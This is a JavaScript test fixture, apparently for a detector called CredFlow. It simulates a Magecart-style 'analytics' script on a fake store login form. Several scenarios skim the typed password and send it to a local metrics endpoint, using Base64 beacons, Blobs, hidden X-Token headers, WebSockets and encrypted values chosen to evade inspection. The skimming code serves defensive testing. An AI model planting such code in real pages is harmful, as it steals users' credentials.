// "Analítica" de la tienda: en los escenarios de robo simula un script comprometido (tipo Magecart).
// Solo para el laboratorio de CredFlow, con credenciales ficticias.
(function () {
  const ESCENARIOS = {
    limpio: "El formulario se envía solo a la tienda. CredFlow no debe alertar.",
    robo: "Un script de terceros envía la contraseña en Base64 al dominio de métricas.",
    "robo-blob": "El script envía la contraseña dentro de un Blob, que Chrome no deja inspeccionar.",
    url: "El script envía la contraseña en la URL de una petición a la propia tienda.",
    cifrado:
      "Como Facebook: la página cifra la contraseña (RSA con Web Crypto) y envía solo el valor cifrado a la tienda.",
    "cifrado-robo":
      "La página cifra la contraseña, pero un script envía ese valor cifrado al dominio de métricas.",
    "robo-encabezado":
      "El script envía la contraseña en Base64 dentro de un encabezado HTTP (X-Token), que la red no deja ver.",
    "robo-websocket": "El script envía la contraseña por un WebSocket al dominio de métricas.",
    "robo-navega":
      "Como un sitio real: el script roba la contraseña y la tienda redirige a otra página tras iniciar sesión.",
  };
  const params = new URLSearchParams(location.search);
  const escenario = params.get("escenario") in ESCENARIOS ? params.get("escenario") : "limpio";
  const METRICAS = `http://127.0.0.1:${location.port}`;

  document.getElementById("escenario").textContent = escenario;
  document.getElementById("descripcion").textContent = ESCENARIOS[escenario];

  const form = document.getElementById("login");
  if (escenario === "robo-navega") {
    // El formulario se envía de verdad y la tienda responde con una redirección, como un sitio real.
    form.action = "/login";
    form.addEventListener("submit", () => {
      const clave = form.querySelector('input[type="password"]').value;
      navigator.sendBeacon(`${METRICAS}/recibir/beacon`, "c=" + btoa(clave));
    });
    return;
  }
  /** Cifra como Facebook: "#PWD_BROWSER:5:<hora>:<cifrado en Base64>" (RSA-OAEP con una clave generada aquí). */
  async function encryptLikeFacebook(clave) {
    const { publicKey } = await crypto.subtle.generateKey(
      { name: "RSA-OAEP", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
      true,
      ["encrypt", "decrypt"]
    );
    const cipher = await crypto.subtle.encrypt({ name: "RSA-OAEP" }, publicKey, new TextEncoder().encode(clave));
    const b64 = btoa(String.fromCharCode(...new Uint8Array(cipher)));
    return `#PWD_BROWSER:5:${Math.floor(Date.now() / 1000)}:${b64}`;
  }

  if (escenario === "cifrado" || escenario === "cifrado-robo") {
    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      const clave = form.querySelector('input[type="password"]').value;
      const encpass = await encryptLikeFacebook(clave);
      const usuario = form.querySelector('input[name="usuario"]').value;
      // La tienda solo recibe el valor cifrado, nunca la contraseña en claro.
      fetch("/recibir/login", { method: "POST", body: new URLSearchParams({ usuario, encpass }) });
      if (escenario === "cifrado-robo") {
        fetch(`${METRICAS}/recibir/cifrado`, { method: "POST", body: new URLSearchParams({ encpass }) });
      }
      document.getElementById("resultado").textContent = "Formulario enviado (contraseña cifrada).";
    });
    return;
  }

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    const clave = form.querySelector('input[type="password"]').value;
    // Envío legítimo a la propia tienda.
    fetch("/recibir/login", { method: "POST", body: new URLSearchParams(new FormData(form)) });
    // Robo, según el escenario.
    if (escenario === "robo") {
      navigator.sendBeacon(`${METRICAS}/recibir/beacon`, "c=" + btoa(clave));
    } else if (escenario === "robo-blob") {
      fetch(`${METRICAS}/recibir/blob`, { method: "POST", body: new Blob([clave]) });
    } else if (escenario === "robo-encabezado") {
      fetch(`${METRICAS}/recibir/encabezado`, { method: "POST", headers: { "X-Token": btoa(clave) } });
    } else if (escenario === "robo-websocket") {
      const socket = new WebSocket(`ws://127.0.0.1:${location.port}/ws`);
      socket.addEventListener("open", () => {
        socket.send(JSON.stringify({ evento: "login", c: clave }));
        socket.close();
      });
    } else if (escenario === "url") {
      fetch("/recibir/consulta?clave=" + encodeURIComponent(clave), { method: "POST" });
    }
    document.getElementById("resultado").textContent = "Formulario enviado.";
  });
})();
